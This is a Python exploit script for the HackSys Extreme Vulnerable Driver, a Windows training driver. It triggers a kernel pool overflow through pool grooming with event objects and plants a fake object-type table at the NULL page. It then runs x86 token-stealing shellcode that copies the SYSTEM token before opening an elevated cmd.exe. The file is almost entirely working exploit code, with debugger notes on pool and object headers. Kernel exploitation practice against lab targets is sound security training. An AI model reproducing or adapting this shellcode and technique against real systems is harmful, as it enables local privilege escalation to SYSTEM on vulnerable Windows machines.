import ctypes, os, struct, sys, win32con
from ctypes import *
from ctypes.wintypes import *
from win32com.shell import shell

ntdll = windll.ntdll
kernel32 = windll.kernel32

def heap_alloc_payload():
	token_stealing_shellcode = (
		#---[Setup]
		"\x60"                      # pushad
		"\x64\xA1\x24\x01\x00\x00" 	# mov eax, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
		"\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" 	# mov ebx, [eax + TOKEN_OFFSET]
		#---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
		"\x75\xED"                  # jnz                           ->|
		"\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
		#---[Recover]
		"\x61"                      # popad		
		"\xC2\x10\x00"              # ret 10
	)
	
	payload_address = id(token_stealing_shellcode) + 20
	print "[+] Payload address: 0x%X" % payload_address
	return payload_address

	
#### Constructing fake nt!_POOL_HEADER and overwriting existing nt!_OBJECT_HEADER with TypeIndex 0x00 (existing has TypeIndex 0x0c)
#
#0: kd> !pool 85902ec0   (any pool with an event object in it is fine - size:40)
#Pool page 85902ec0 region is Nonpaged pool
#*85902ec0 size:   40 previous size:  200  (Allocated) *Even (Protected)
#		Pooltag Even : Event objects
#
#0: kd> dc 858c9ec0 LA
#858c9ec0  04080008 ee657645 00000000 00000040  ....Eve.....@...
#858c9ed0  00000000 00000000 00000001 00000001  ................
#858c9ee0  00000000 0008000c                    ........
#
#0: kd> dt nt!_POOL_HEADER 85902ec0 
#   +0x000 PreviousSize     : 0y001000000 (0x40)
#   +0x000 PoolIndex        : 0y0000000 (0)
#   +0x002 BlockSize        : 0y000001000 (0x8)
#   +0x002 PoolType         : 0y0000010 (0x2)
#   +0x000 Ulong1           : 0x4080040
#   +0x004 PoolTag          : 0xee657645
#   +0x004 AllocatorBackTraceIndex : 0x7645
#   +0x006 PoolTagHash      : 0xee65
#
#0: kd> dt nt!_OBJECT_HEADER 858c9ec0 + 18
#   +0x000 PointerCount     : 0n1
#   +0x004 HandleCount      : 0n1
#   +0x004 NextToFree       : 0x00000001 Void
#   +0x008 Lock             : _EX_PUSH_LOCK
#   +0x00c TypeIndex        : 0xc ''
#   +0x00d TraceFlags       : 0 ''
#   +0x00e InfoMask         : 0x8 ''
#   +0x00f Flags            : 0 ''
#   +0x010 ObjectCreateInfo : 0x86adfa80 _OBJECT_CREATE_INFORMATION
#   +0x010 QuotaBlockCharged : 0x86adfa80 Void
#   +0x014 SecurityDescriptor : (null) 
#   +0x018 Body             : _QUAD
#####
	
event_object_array_1 = []
event_object_array_2 = []
	
def pool_feng_shui_with_event_objects():
	global event_object_array_1
	global event_object_array_2
	print "[+] Defragmenting heap"
	for x in range(10000):
		event_object_array_1.append(kernel32.CreateEventA(None, False, False, None))
	print "[+] Allocating Event Objects"
	for y in range(5000):
		event_object_array_2.append(kernel32.CreateEventA(None, False, False, None))
	print "[+] Freeing selected Event Objects"
	for x in range (0,5000,16):
		for y in range (8):
				kernel32.CloseHandle(event_object_array_2[ x + y ])

def free_remaining_event_objects():
	global event_object_array_1
	global event_object_array_2
	print "[+] Freeing remaining Event Objects to trigger vuln .."
	for x in range(10000):
		kernel32.CloseHandle(event_object_array_1[x])
	for x in range (8,5000,16):
		for y in range (8):
				kernel32.CloseHandle(event_object_array_2[ x + y ])
	
	
def NtAllocateVirtualMemory_shellcode_ptr():
	base_address = c_void_p(0x1)
	null_size = c_int(0x1000)
	nt_result = ntdll.NtAllocateVirtualMemory(kernel32.GetCurrentProcess(), byref(base_address), 0, byref(null_size), win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
	shellcode_ptr = heap_alloc_payload()
	csrc = create_string_buffer("\x00" * 0x70 + struct.pack("<L",shellcode_ptr), 0x74)
	memmove_result = ctypes.memmove(0x4, addressof(csrc), 0x74)
	print "[+] Allocating fake OBJECT_TYPE_INITIALIZER at NULL page"
	print "      - OkayToCloseProcedure: ptr to shellcode"
	print "      - All other procedures: NULLed out"

				
def trigger_pool_overflow():
	dwReturn      = c_ulong()
	driver_handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
	if not driver_handle or driver_handle == -1:
		print "[!] Driver handle not found : Error " + str(ctypes.GetLastError())
		sys.exit()
		
	pool_feng_shui_with_event_objects()
	NtAllocateVirtualMemory_shellcode_ptr()
	
	pool_buffer_size = 504
		
	#85902ec0  04080040 ee657645 00000000 00000040  @...Eve.....@...
	#85902ed0  00000000 00000000                    ........
	POOL_HEADER = "\x40\x00\x08\x04\x45\x76\x65\xEE\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	
	#86bda3e0  00000001 00000001 00000000 0008000c  ................ (change 0x0c to 0x00)
	OBJECT_HEADER = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00"
	
	print "[+] Constructing fake POOL_HEADER and modified OBJECT_HEADER"
	evil_input = "\x41" * pool_buffer_size + POOL_HEADER + OBJECT_HEADER
	evil_size  = len(evil_input)
	evil_input_ptr = id(evil_input) + 20
	
	print "[+] Triggering Pool Overflow"
	kernel32.DeviceIoControl(driver_handle, 0x22200F, evil_input_ptr, evil_size, None, 0,byref(dwReturn), None)
	
	free_remaining_event_objects()
	
	if shell.IsUserAnAdmin():
		print "[*] Enjoy Elevated Privs !\r\n"
		os.system('cmd.exe')
	else:
		print "[!] Exploit did not work. Re-run it!"
	
	
def preamble():
	print "\r\n"
	print "HackSys Extreme Vulnerable Driver : Pool Overflow"
	print "Author: @GradiusX"
	print "References: AWE Kernel Exploitation"
	print "            http://codemachine.com/article_objectheader.html"
	print "            http://www.ivanlef0u.tuxfamily.org/?p=79"
	print "\r\n"
	
if __name__ == '__main__':
	preamble()
	trigger_pool_overflow()